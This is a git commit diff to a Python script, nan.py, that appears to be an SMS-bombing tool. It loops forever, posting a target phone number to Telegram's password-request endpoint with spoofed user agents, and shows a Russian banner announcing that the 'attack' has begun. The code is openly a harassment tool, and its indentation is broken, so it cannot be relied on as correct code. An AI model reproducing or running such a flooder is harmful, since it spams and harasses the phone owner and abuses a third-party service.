5db9ee8591b91ab7616403888389ff263200a82a
nanotez <97647355+nanotez@users.noreply.github.com>
2022-01-14 16:27:33 +0200

    Update nan.py

--- nan.py
+++ nan.py
@@ -1,6 +1,20 @@
+import os, sys
+import fake_useragent
 import requests
+from colorama import *
+init()
 
-nomer = imput("Номер")
+
+x = 0
+y = 0
+
+
+def effect(message):
+    for char in message:
+        sys.stdout.write(char)
+        sys.stdout.flush()
+
+message22 = '\n        [\033[31m!\033[33m] АТАКА НАЧАЛАСЬ, ДЛЯ ОСТАНОВКИ НАЖМИТЕ CTRL + C [\033[31m!\033[33m] \n '
 
 def _sms(phone):
     global x, y
@@ -11,7 +25,7 @@ def _sms(phone):
     effect(message22)
 
     while True:
-            x += 1
+        x += 1
             a = requests.post("https://my.telegram.org/auth/send_password",
             data={"phone": "+" + phone}, headers=headers1, timeout=5.05)
             print('\n        [\033[32m+\033[33m] сообщение от telegram отправлено!')
